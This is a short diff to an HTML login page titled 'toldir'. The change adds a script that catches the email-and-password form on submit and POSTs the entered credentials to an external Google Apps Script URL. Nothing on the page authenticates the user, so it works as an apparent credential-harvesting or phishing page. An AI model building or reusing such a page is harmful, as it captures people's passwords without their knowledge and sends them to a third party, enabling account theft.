@@ -6,10 +6,25 @@
   <title>toldir</title>
 </head>
 <body>
-<form>
+<form name="sizga">
   <input type="email" name="email" id="email" placeholder="Enter your email" required>
   <input type="password" name="password" id="password" placeholder="Enter your password" required>
   <button type="submit">Submit</button>
 </form>
+
+
+
+<script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbzDXnPZ2JoXXuzWjieI3o1zatbFSJ30HIg7yhg8oa7hWGkzhtSfkhtR1ZHzjB4I5vbPXQ/exec'
+  const form = document.forms['sizga']
+
+  form.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(response => console.log('Success!', response))
+      .catch(error => console.error('Error!', error.message))
+  })
+</script>
+
 </body>
 </html>
